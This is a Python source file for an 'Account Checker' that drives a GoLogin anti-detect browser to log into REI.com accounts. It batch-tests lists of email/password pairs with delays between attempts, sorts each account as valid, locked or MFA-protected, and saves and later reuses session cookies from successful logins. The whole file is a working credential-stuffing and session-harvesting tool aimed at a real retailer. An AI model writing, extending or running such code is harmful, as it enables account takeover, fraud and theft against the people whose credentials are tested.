"""
Account Checker
Validates REI.com account credentials
"""

import asyncio
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any, List as ListType
from bs4 import BeautifulSoup
from loguru import logger

from config import config
from browser import GoLoginBrowser


@dataclass
class AccountResult:
    """Account check result"""
    valid: bool = False
    email: Optional[str] = None
    error: Optional[str] = None
    needs_mfa: bool = False
    locked: bool = False
    errors: List[str] = field(default_factory=list)
    cookies: Optional[List[Dict]] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "valid": self.valid,
            "email": self.email,
            "error": self.error,
            "needs_mfa": self.needs_mfa,
            "locked": self.locked,
            "errors": self.errors
        }


class AccountChecker:
    """
    Account Checker
    Validates REI.com account credentials
    """
    
    def __init__(self):
        self.browser = GoLoginBrowser()
    
    def _parse_login_result(self, html: str, url: str) -> AccountResult:
        """Parse login result from HTML"""
        result = AccountResult()
        soup = BeautifulSoup(html, "lxml")
        
        # Check for success indicators
        if "account" in url and "signin" not in url:
            result.valid = True
            return result
        
        if soup.select_one('[data-testid="account-menu"], [data-testid="user-menu"]'):
            result.valid = True
            return result
        
        if "Sign Out" in html or "sign out" in html.lower():
            result.valid = True
            return result
        
        # Check for MFA requirement
        mfa_indicators = ["verification", "two-factor", "2fa", "authenticate", 
                         "multi-factor", "security code"]
        html_lower = html.lower()
        if any(ind in html_lower for ind in mfa_indicators):
            result.needs_mfa = True
            result.errors.append("Account requires multi-factor authentication")
            return result
        
        # Check for locked account
        lock_indicators = ["account has been locked", "account is locked", 
                          "too many attempts", "locked out"]
        if any(ind in html_lower for ind in lock_indicators):
            result.locked = True
            result.errors.append("Account is locked due to too many failed attempts")
            return result
        
        # Check for specific errors
        error_messages = {
            "invalid_email": ["email address is invalid", "enter a valid email", "invalid email"],
            "invalid_password": ["incorrect password", "wrong password", "invalid password", "doesn't match"],
            "not_found": ["account not found", "couldn't find an account", "no account found", "not exist"]
        }
        
        for error_type, messages in error_messages.items():
            if any(msg in html_lower for msg in messages):
                result.errors.append(f"Login failed: {error_type.replace('_', ' ')}")
        
        # Check for generic error
        error_alert = soup.select_one('[data-testid="error-alert"], .error-message, .alert-error, [role="alert"]')
        if error_alert:
            error_text = error_alert.get_text(strip=True)
            if error_text and error_text not in result.errors:
                result.error = error_text
                result.errors.append(error_text)
        
        return result
    
    async def check_account(self, email: str, password: str,
                           timeout: int = 30000,
                           save_cookies: bool = False) -> AccountResult:
        """
        Check account credentials
        
        Args:
            email: Account email
            password: Account password
            timeout: Request timeout in milliseconds
            save_cookies: Save session cookies if valid
            
        Returns:
            AccountResult with validation info
        """
        logger.info(f"Checking account: {email}")
        result = AccountResult(email=email)
        
        try:
            # Launch browser
            await self.browser.initialize()
            await self.browser.launch(profile_name=f"REI-Account-{email.split('@')[0]}")
            
            # Navigate to login page
            await self.browser.navigate(config.rei.account_url)
            await self.browser.page.wait_for_load_state("networkidle")
            
            # Wait for login form
            await self.browser.wait_for_selector(
                'form, input[type="email"], input[name="email"]',
                timeout=10000
            )
            
            # Enter email
            await self.browser.fill('input[type="email"], input[name="email"], input#email', email)
            await asyncio.sleep(0.5)
            
            # Click continue if present
            continue_btn = await self.browser.page.query_selector(
                'button[type="submit"], button:has-text("Continue")'
            )
            if continue_btn:
                await continue_btn.click()
                await asyncio.sleep(1.5)
            
            # Enter password
            await self.browser.fill(
                'input[type="password"], input[name="password"], input#password',
                password
            )
            await asyncio.sleep(0.5)
            
            # Submit form
            submit_btn = await self.browser.page.query_selector(
                'button[type="submit"], button:has-text("Sign In")'
            )
            if submit_btn:
                await submit_btn.click()
            
            # Wait for response
            await asyncio.sleep(3)
            
            # Get page content
            html = await self.browser.get_content()
            current_url = self.browser.page.url
            
            # Determine result
            if "account" in current_url and "signin" not in current_url:
                result.valid = True
            else:
                parse_result = self._parse_login_result(html, current_url)
                result.valid = parse_result.valid
                result.needs_mfa = parse_result.needs_mfa
                result.locked = parse_result.locked
                result.errors = parse_result.errors
                result.error = parse_result.error
            
            # Save cookies if requested and valid
            if save_cookies and result.valid:
                storage_state = await self.browser.context.storage_state()
                result.cookies = storage_state.get("cookies", [])
            
            await self.browser.close()
            
            status = "Valid" if result.valid else "Invalid"
            logger.info(f"Account check complete: {email} - {status}")
            return result
            
        except Exception as e:
            logger.error(f"Account check failed: {e}")
            result.error = str(e)
            try:
                await self.browser.close()
            except:
                pass
            return result
    
    async def batch_check(self, accounts: List[Dict[str, str]],
                         delay: int = 3000) -> List[AccountResult]:
        """
        Batch check multiple accounts
        
        Args:
            accounts: List of dicts with 'email' and 'password' keys
            delay: Delay between requests in milliseconds
            
        Returns:
            List of AccountResult
        """
        results = []
        
        for account in accounts:
            result = await self.check_account(
                email=account.get("email"),
                password=account.get("password")
            )
            results.append(result)
            
            if delay > 0:
                await asyncio.sleep(delay / 1000)
        
        return results
    
    async def validate_session(self, cookies: List[Dict[str, str]]) -> AccountResult:
        """
        Validate session by checking stored cookies
        
        Args:
            cookies: List of cookie dictionaries
            
        Returns:
            AccountResult
        """
        result = AccountResult()
        
        try:
            await self.browser.initialize()
            await self.browser.launch(profile_name="REI-Session-Validate")
            
            # Add cookies
            await self.browser.context.add_cookies(cookies)
            
            # Navigate to account page
            await self.browser.navigate(f"{config.rei.base_url}/account")
            await self.browser.page.wait_for_load_state("networkidle")
            
            html = await self.browser.get_content()
            logged_in = "Sign In" not in html and ("Sign Out" in html or "My Account" in html)
            
            result.valid = logged_in
            
            if not logged_in and "locked" in html.lower():
                result.locked = True
                result.error = "Account is locked"
            
            await self.browser.close()
            return result
            
        except Exception as e:
            logger.error(f"Session validation failed: {e}")
            result.error = str(e)
            try:
                await self.browser.close()
            except:
                pass
            return result


# Synchronous wrapper
class AccountCheckerSync:
    """Synchronous wrapper for AccountChecker"""
    
    def __init__(self):
        self.checker = AccountChecker()
    
    def check(self, email: str, password: str) -> AccountResult:
        """Check account synchronously"""
        return asyncio.run(self.checker.check_account(email, password))
